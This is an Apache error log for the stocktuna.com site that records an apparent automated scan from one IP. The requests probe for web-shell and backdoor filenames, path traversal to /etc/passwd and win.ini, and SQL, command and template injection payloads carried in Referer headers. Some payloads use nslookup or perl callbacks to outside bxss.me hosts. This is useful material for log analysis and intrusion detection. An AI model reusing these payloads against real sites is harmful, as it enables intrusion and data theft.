[Wed Jul 07 23:41:25.271475 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/r58.php' not found or unable to stat
[Wed Jul 07 23:41:25.506609 2021] [php7:error] [pid 23127] [client 27.147.202.214:12121] script '/var/www/html/stocktuna.com/index (3rd copy).php' not found or unable to stat
[Wed Jul 07 23:41:25.596570 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/c99shell.php' not found or unable to stat
[Wed Jul 07 23:41:25.839470 2021] [php7:error] [pid 23127] [client 27.147.202.214:12121] script '/var/www/html/stocktuna.com/index (third copy).php' not found or unable to stat
[Wed Jul 07 23:41:25.914639 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/c99.php' not found or unable to stat
[Wed Jul 07 23:41:27.702579 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/nstview.php' not found or unable to stat
[Wed Jul 07 23:41:27.711710 2021] [php7:error] [pid 23127] [client 27.147.202.214:12121] script '/var/www/html/stocktuna.com/index (4th copy).php' not found or unable to stat
[Wed Jul 07 23:41:27.990748 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/nst.php' not found or unable to stat
[Wed Jul 07 23:41:28.003248 2021] [php7:error] [pid 23127] [client 27.147.202.214:12121] script '/var/www/html/stocktuna.com/index - Copy - Copy.php' not found or unable to stat
[Wed Jul 07 23:41:29.363101 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/rst.php' not found or unable to stat
[Wed Jul 07 23:41:30.591619 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/r57eng.php' not found or unable to stat
[Wed Jul 07 23:41:31.054612 2021] [authz_core:error] [pid 23127] [client 27.147.202.214:12121] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/sass/.htaccess~
[Wed Jul 07 23:41:31.927187 2021] [authz_core:error] [pid 23127] [client 27.147.202.214:12121] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/sass/.htaccess.old
[Wed Jul 07 23:41:31.955761 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/shell.php' not found or unable to stat
[Wed Jul 07 23:41:32.223251 2021] [authz_core:error] [pid 23127] [client 27.147.202.214:12121] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/sass/.htaccess.save
[Wed Jul 07 23:41:32.243205 2021] [php7:error] [pid 23250] [client 27.147.202.214:14837] script '/var/www/html/stocktuna.com/assets/fonts/_notes/dra.php' not found or unable to stat
[Wed Jul 07 23:41:32.538318 2021] [php7:error] [pid 23272] [client 27.147.202.214:7985] script '/var/www/html/stocktuna.com/assets/fonts/_notes/r.php' not found or unable to stat
[Wed Jul 07 23:41:32.819647 2021] [php7:error] [pid 23272] [client 27.147.202.214:7985] script '/var/www/html/stocktuna.com/assets/fonts/_notes/lol.php' not found or unable to stat
[Wed Jul 07 23:41:33.210737 2021] [php7:error] [pid 23272] [client 27.147.202.214:7985] script '/var/www/html/stocktuna.com/assets/fonts/_notes/zehir.php' not found or unable to stat
[Wed Jul 07 23:41:33.531391 2021] [php7:error] [pid 23272] [client 27.147.202.214:7985] script '/var/www/html/stocktuna.com/assets/fonts/_notes/c-h.v2.php' not found or unable to stat
[Wed Jul 07 23:41:33.833882 2021] [php7:error] [pid 23272] [client 27.147.202.214:7985] script '/var/www/html/stocktuna.com/assets/fonts/_notes/php-backdoor.php' not found or unable to stat
[Wed Jul 07 23:41:34.153891 2021] [php7:error] [pid 23272] [client 27.147.202.214:7985] script '/var/www/html/stocktuna.com/assets/fonts/_notes/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 23:41:34.925846 2021] [php7:error] [pid 23274] [client 27.147.202.214:10199] script '/var/www/html/stocktuna.com/assets/fonts/_notes/php.php' not found or unable to stat
[Wed Jul 07 23:41:35.024504 2021] [authz_core:error] [pid 23098] [client 27.147.202.214:7963] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/fonts/.htaccess~
[Wed Jul 07 23:41:35.341552 2021] [authz_core:error] [pid 22989] [client 27.147.202.214:4395] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/fonts/.htaccess.old
[Wed Jul 07 23:41:35.566918 2021] [php7:error] [pid 23274] [client 27.147.202.214:10199] script '/var/www/html/stocktuna.com/assets/fonts/_notes/i.php' not found or unable to stat
[Wed Jul 07 23:41:35.655802 2021] [authz_core:error] [pid 22989] [client 27.147.202.214:4395] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/fonts/.htaccess.save
[Wed Jul 07 23:41:35.888932 2021] [php7:error] [pid 23274] [client 27.147.202.214:10199] script '/var/www/html/stocktuna.com/assets/fonts/_notes/test.php' not found or unable to stat
[Wed Jul 07 23:41:36.386461 2021] [core:error] [pid 23245] [client 27.147.202.214:7916] AH00126: Invalid URI in request GET /icons//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 23:41:36.849217 2021] [php7:error] [pid 23274] [client 27.147.202.214:10199] script '/var/www/html/stocktuna.com/assets/fonts/_notes/temp.php' not found or unable to stat
[Wed Jul 07 23:41:39.400952 2021] [php7:error] [pid 23274] [client 27.147.202.214:10199] script '/var/www/html/stocktuna.com/assets/fonts/_notes/info.php' not found or unable to stat
[Wed Jul 07 23:41:46.002065 2021] [php7:error] [pid 23028] [client 27.147.202.214:13169] script '/var/www/html/stocktuna.com/old_index.php' not found or unable to stat
[Wed Jul 07 23:41:47.673799 2021] [php7:error] [pid 23028] [client 27.147.202.214:13169] script '/var/www/html/stocktuna.com/index_old.php' not found or unable to stat
[Wed Jul 07 23:41:47.968540 2021] [php7:error] [pid 23028] [client 27.147.202.214:13169] script '/var/www/html/stocktuna.com/bak_index.php' not found or unable to stat
[Wed Jul 07 23:41:49.238851 2021] [php7:error] [pid 23028] [client 27.147.202.214:13169] script '/var/www/html/stocktuna.com/index_bak.php' not found or unable to stat
[Wed Jul 07 23:41:50.502815 2021] [php7:error] [pid 23028] [client 27.147.202.214:13169] script '/var/www/html/stocktuna.com/backup_index.php' not found or unable to stat
[Wed Jul 07 23:41:51.605019 2021] [php7:error] [pid 23028] [client 27.147.202.214:13169] script '/var/www/html/stocktuna.com/index_backup.php' not found or unable to stat
[Wed Jul 07 23:42:05.658643 2021] [core:error] [pid 23296] (36)File name too long: [client 27.147.202.214:10534] AH00036: access to /;(nslookup hitpbrlozukicc2894.bxss.me||perl -e "gethostbyname('hitpbrlozukicc2894.bxss.me')")|(nslookup hitpbrlozukicc2894.bxss.me||perl -e "gethostbyname('hitpbrlozukicc2894.bxss.me')")&(nslookup hitpbrlozukicc2894.bxss.me||perl -e "gethostbyname('hitpbrlozukicc2894.bxss.me')")/css/ failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitpbrlozukicc2894.bxss.me||perl -e "gethostbyname('hitpbrlozukicc2894.bxss.me')")|(nslookup hitpbrlozukicc2894.bxss.me||perl -e "gethostbyname('hitpbrlozukicc2894.bxss.me')")&(nslookup hitpbrlozukicc2894.bxss.me||perl -e "gethostbyname('hitpbrlozukicc2894.bxss.me')")')
[Wed Jul 07 23:42:07.982150 2021] [authz_core:error] [pid 23272] [client 27.147.202.214:7985] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/fonts/_notes/.htaccess~
[Wed Jul 07 23:42:09.366558 2021] [authz_core:error] [pid 23272] [client 27.147.202.214:7985] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/fonts/_notes/.htaccess.old
[Wed Jul 07 23:42:10.588091 2021] [authz_core:error] [pid 23272] [client 27.147.202.214:7985] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/fonts/_notes/.htaccess.save
[Wed Jul 07 23:42:11.008189 2021] [core:error] [pid 23028] [client 27.147.202.214:13169] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 23:42:11.454349 2021] [core:error] [pid 23274] [client 27.147.202.214:10199] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 23:42:13.829807 2021] [core:error] [pid 23005] [client 27.147.202.214:10979] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 23:42:22.734621 2021] [core:error] [pid 23290] [client 27.147.202.214:13040] AH00126: Invalid URI in request GET /icons//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 23:42:25.980621 2021] [core:error] [pid 23272] (36)File name too long: [client 27.147.202.214:7304] AH00036: access to /;(nslookup hitrjefzkhrxcf3f10.bxss.me||perl -e "gethostbyname('hitrjefzkhrxcf3f10.bxss.me')")|(nslookup hitrjefzkhrxcf3f10.bxss.me||perl -e "gethostbyname('hitrjefzkhrxcf3f10.bxss.me')")&(nslookup hitrjefzkhrxcf3f10.bxss.me||perl -e "gethostbyname('hitrjefzkhrxcf3f10.bxss.me')")/js/ failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitrjefzkhrxcf3f10.bxss.me||perl -e "gethostbyname('hitrjefzkhrxcf3f10.bxss.me')")|(nslookup hitrjefzkhrxcf3f10.bxss.me||perl -e "gethostbyname('hitrjefzkhrxcf3f10.bxss.me')")&(nslookup hitrjefzkhrxcf3f10.bxss.me||perl -e "gethostbyname('hitrjefzkhrxcf3f10.bxss.me')")')
[Wed Jul 07 23:42:28.866142 2021] [core:error] [pid 23064] (36)File name too long: [client 27.147.202.214:7318] AH00036: access to /;(nslookup hitkhefeacscsc5fbd.bxss.me||perl -e "gethostbyname('hitkhefeacscsc5fbd.bxss.me')")|(nslookup hitkhefeacscsc5fbd.bxss.me||perl -e "gethostbyname('hitkhefeacscsc5fbd.bxss.me')")&(nslookup hitkhefeacscsc5fbd.bxss.me||perl -e "gethostbyname('hitkhefeacscsc5fbd.bxss.me')")/sass/ failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitkhefeacscsc5fbd.bxss.me||perl -e "gethostbyname('hitkhefeacscsc5fbd.bxss.me')")|(nslookup hitkhefeacscsc5fbd.bxss.me||perl -e "gethostbyname('hitkhefeacscsc5fbd.bxss.me')")&(nslookup hitkhefeacscsc5fbd.bxss.me||perl -e "gethostbyname('hitkhefeacscsc5fbd.bxss.me')")')
[Wed Jul 07 23:42:32.016274 2021] [core:error] [pid 23290] [client 27.147.202.214:2941] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 23:42:32.653220 2021] [core:error] [pid 23110] [client 27.147.202.214:7370] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 23:42:35.707423 2021] [core:error] [pid 23064] (36)File name too long: [client 27.147.202.214:7318] AH00036: access to /;(nslookup hitxqrfqjgwhb22736.bxss.me||perl -e "gethostbyname('hitxqrfqjgwhb22736.bxss.me')")|(nslookup hitxqrfqjgwhb22736.bxss.me||perl -e "gethostbyname('hitxqrfqjgwhb22736.bxss.me')")&(nslookup hitxqrfqjgwhb22736.bxss.me||perl -e "gethostbyname('hitxqrfqjgwhb22736.bxss.me')")/fonts/ failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitxqrfqjgwhb22736.bxss.me||perl -e "gethostbyname('hitxqrfqjgwhb22736.bxss.me')")|(nslookup hitxqrfqjgwhb22736.bxss.me||perl -e "gethostbyname('hitxqrfqjgwhb22736.bxss.me')")&(nslookup hitxqrfqjgwhb22736.bxss.me||perl -e "gethostbyname('hitxqrfqjgwhb22736.bxss.me')")')
[Wed Jul 07 23:42:38.461805 2021] [core:error] [pid 23098] [client 27.147.202.214:7373] AH00126: Invalid URI in request GET /icons/../../Gemfile HTTP/1.1
[Wed Jul 07 23:42:39.765266 2021] [core:error] [pid 23064] [client 27.147.202.214:7318] AH00126: Invalid URI in request GET /icons/../../web.config HTTP/1.1
[Wed Jul 07 23:42:42.604859 2021] [core:error] [pid 23098] [client 27.147.202.214:5273] AH00126: Invalid URI in request GET /icons/../../package.json HTTP/1.1
[Wed Jul 07 23:42:43.459132 2021] [core:error] [pid 23247] [client 27.147.202.214:2440] AH00126: Invalid URI in request GET /icons/../../package-lock.json HTTP/1.1
[Wed Jul 07 23:42:44.902575 2021] [core:error] [pid 23278] [client 27.147.202.214:4575] AH00126: Invalid URI in request GET /icons/../../../Gemfile HTTP/1.1
[Wed Jul 07 23:42:45.232338 2021] [core:error] [pid 23075] [client 27.147.202.214:4559] AH00126: Invalid URI in request GET /icons/../../../web.config HTTP/1.1
[Wed Jul 07 23:42:46.457625 2021] [core:error] [pid 23247] [client 27.147.202.214:9790] AH00126: Invalid URI in request GET /icons/../../../package.json HTTP/1.1
[Wed Jul 07 23:42:52.496866 2021] [core:error] [pid 23075] [client 27.147.202.214:7259] AH00126: Invalid URI in request GET /icons/../../../package-lock.json HTTP/1.1
[Wed Jul 07 23:42:54.567339 2021] [core:error] [pid 22730] [client 27.147.202.214:1330] AH00126: Invalid URI in request GET /icons/../../../../Gemfile HTTP/1.1
[Wed Jul 07 23:42:54.863467 2021] [core:error] [pid 23273] [client 27.147.202.214:9782] AH00126: Invalid URI in request GET /icons/../../../../web.config HTTP/1.1
[Wed Jul 07 23:42:55.852140 2021] [core:error] [pid 23094] [client 27.147.202.214:14035] AH00126: Invalid URI in request GET /icons/../../../../package.json HTTP/1.1
[Wed Jul 07 23:42:58.031426 2021] [core:error] [pid 23098] [client 27.147.202.214:9787] AH00126: Invalid URI in request GET /icons/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 23:43:03.543129 2021] [core:error] [pid 23060] [client 27.147.202.214:7257] AH00126: Invalid URI in request GET /icons/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 23:43:03.825224 2021] [core:error] [pid 23272] [client 27.147.202.214:9217] AH00126: Invalid URI in request GET /icons/../../../../../web.config HTTP/1.1
[Wed Jul 07 23:43:04.277825 2021] [core:error] [pid 23278] (36)File name too long: [client 27.147.202.214:11218] AH00036: access to /assets/;(nslookup hitcvcgvsnnyfe67be.bxss.me||perl -e "gethostbyname('hitcvcgvsnnyfe67be.bxss.me')")|(nslookup hitcvcgvsnnyfe67be.bxss.me||perl -e "gethostbyname('hitcvcgvsnnyfe67be.bxss.me')")&(nslookup hitcvcgvsnnyfe67be.bxss.me||perl -e "gethostbyname('hitcvcgvsnnyfe67be.bxss.me')")/ failed (filesystem path '/var/www/html/stocktuna.com/assets/;(nslookup hitcvcgvsnnyfe67be.bxss.me||perl -e "gethostbyname('hitcvcgvsnnyfe67be.bxss.me')")|(nslookup hitcvcgvsnnyfe67be.bxss.me||perl -e "gethostbyname('hitcvcgvsnnyfe67be.bxss.me')")&(nslookup hitcvcgvsnnyfe67be.bxss.me||perl -e "gethostbyname('hitcvcgvsnnyfe67be.bxss.me')")')
[Wed Jul 07 23:43:04.692450 2021] [core:error] [pid 23273] [client 27.147.202.214:3059] AH00126: Invalid URI in request GET /icons/../../../../../package.json HTTP/1.1
[Wed Jul 07 23:43:04.983352 2021] [core:error] [pid 23278] [client 27.147.202.214:11218] AH00126: Invalid URI in request GET /icons/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 23:55:07.050351 2021] [autoindex:error] [pid 23575] [client 27.147.202.214:7623] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://stocktuna.com/
[Wed Jul 07 23:55:08.718755 2021] [autoindex:error] [pid 23698] [client 27.147.202.214:7608] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 23:55:08.814088 2021] [autoindex:error] [pid 23688] [client 27.147.202.214:7637] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:09.675270 2021] [autoindex:error] [pid 23428] [client 27.147.202.214:7641] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:10.635152 2021] [autoindex:error] [pid 23697] [client 27.147.202.214:13807] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: g3XN8ekU
[Wed Jul 07 23:55:10.948674 2021] [autoindex:error] [pid 23709] [client 27.147.202.214:13797] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1 OR 2+149-149-1=0+0+0+1 --
[Wed Jul 07 23:55:11.268045 2021] [autoindex:error] [pid 23709] [client 27.147.202.214:13797] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1 OR 2+351-351-1=0+0+0+1
[Wed Jul 07 23:55:11.556224 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1' OR 2+69-69-1=0+0+0+1 --
[Wed Jul 07 23:55:11.878454 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1' OR 2+34-34-1=0+0+0+1 or 'B8ftZKGL'='
[Wed Jul 07 23:55:11.893377 2021] [autoindex:error] [pid 23709] [client 27.147.202.214:13797] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing%00
[Wed Jul 07 23:55:12.198633 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: -1" OR 2+906-906-1=0+0+0+1 --
[Wed Jul 07 23:55:12.217765 2021] [autoindex:error] [pid 23709] [client 27.147.202.214:13797] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:12.412157 2021] [autoindex:error] [pid 23714] [client 27.147.202.214:13801] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: echo gxelcw$()\\ tmapgv\\nz^xyu||a #' &echo gxelcw$()\\ tmapgv\\nz^xyu||a #|" &echo gxelcw$()\\ tmapgv\\nz^xyu||a #
[Wed Jul 07 23:55:12.538623 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:12.738111 2021] [autoindex:error] [pid 23714] [client 27.147.202.214:13801] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: &echo dhuvlr$()\\ lqaeeg\\nz^xyu||a #' &echo dhuvlr$()\\ lqaeeg\\nz^xyu||a #|" &echo dhuvlr$()\\ lqaeeg\\nz^xyu||a #
[Wed Jul 07 23:55:13.022538 2021] [autoindex:error] [pid 23711] [client 27.147.202.214:13802] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: |echo fdegsj$()\\ qcrtmn\\nz^xyu||a #' |echo fdegsj$()\\ qcrtmn\\nz^xyu||a #|" |echo fdegsj$()\\ qcrtmn\\nz^xyu||a #
[Wed Jul 07 23:55:13.311321 2021] [autoindex:error] [pid 23711] [client 27.147.202.214:13802] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: (nslookup hitylilhiddpq092d2.bxss.me||perl -e "gethostbyname('hitylilhiddpq092d2.bxss.me')")
[Wed Jul 07 23:55:13.733147 2021] [autoindex:error] [pid 23697] [client 27.147.202.214:13807] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: if(now()=sysdate(),sleep(15),0)
[Wed Jul 07 23:55:13.897355 2021] [autoindex:error] [pid 23712] [client 27.147.202.214:13799] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: $(nslookup hitgkiyccgrsoa3307.bxss.me||perl -e "gethostbyname('hitgkiyccgrsoa3307.bxss.me')")
[Wed Jul 07 23:55:14.486470 2021] [autoindex:error] [pid 23719] [client 27.147.202.214:13814] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: &(nslookup hitsznancvlvkd48de.bxss.me||perl -e "gethostbyname('hitsznancvlvkd48de.bxss.me')")&'\\"`0&(nslookup hitsznancvlvkd48de.bxss.me||perl -e "gethostbyname('hitsznancvlvkd48de.bxss.me')")&`'
[Wed Jul 07 23:55:15.116073 2021] [autoindex:error] [pid 23711] [client 27.147.202.214:13802] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: |(nslookup hitaokpmgsmmvf09d1.bxss.me||perl -e "gethostbyname('hitaokpmgsmmvf09d1.bxss.me')")
[Wed Jul 07 23:55:15.293636 2021] [autoindex:error] [pid 23712] [client 27.147.202.214:13799] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://stocktuna.com/
[Wed Jul 07 23:55:15.506414 2021] [autoindex:error] [pid 23697] [client 27.147.202.214:13807] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
[Wed Jul 07 23:55:15.615468 2021] [autoindex:error] [pid 23707] [client 27.147.202.214:13811] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 12345'"\\'\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa1
[Wed Jul 07 23:55:15.907213 2021] [autoindex:error] [pid 23443] [client 27.147.202.214:13803] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing<esi:include src="http://bxss.me/rpb.png"/>
[Wed Jul 07 23:55:15.931335 2021] [autoindex:error] [pid 23707] [client 27.147.202.214:13811] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:15.972500 2021] [autoindex:error] [pid 23714] [client 27.147.202.214:13801] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ${9999606+9999775}
[Wed Jul 07 23:55:16.046153 2021] [autoindex:error] [pid 23725] [client 27.147.202.214:13833] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.048901 2021] [autoindex:error] [pid 23710] [client 27.147.202.214:13800] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: `(nslookup hitonjmoebdohc4772.bxss.me||perl -e "gethostbyname('hitonjmoebdohc4772.bxss.me')")`
[Wed Jul 07 23:55:16.120482 2021] [autoindex:error] [pid 23721] [client 27.147.202.214:13827] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: )
[Wed Jul 07 23:55:16.209342 2021] [autoindex:error] [pid 23729] [client 27.147.202.214:13836] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.220991 2021] [autoindex:error] [pid 23718] [client 27.147.202.214:13813] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.233007 2021] [autoindex:error] [pid 23707] [client 27.147.202.214:13811] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: '.gethostbyname(lc('hitfk'.'auvqsiro03bdf.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(120).chr(71).chr(116).chr(84).'
[Wed Jul 07 23:55:16.257019 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.339136 2021] [autoindex:error] [pid 23725] [client 27.147.202.214:13833] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 1some_inexistent_file_with_long_name%00.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.398971 2021] [autoindex:error] [pid 23721] [client 27.147.202.214:13827] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: !(()&&!|*|*|
[Wed Jul 07 23:55:16.496515 2021] [autoindex:error] [pid 23729] [client 27.147.202.214:13836] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.516902 2021] [autoindex:error] [pid 23718] [client 27.147.202.214:13813] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.574547 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
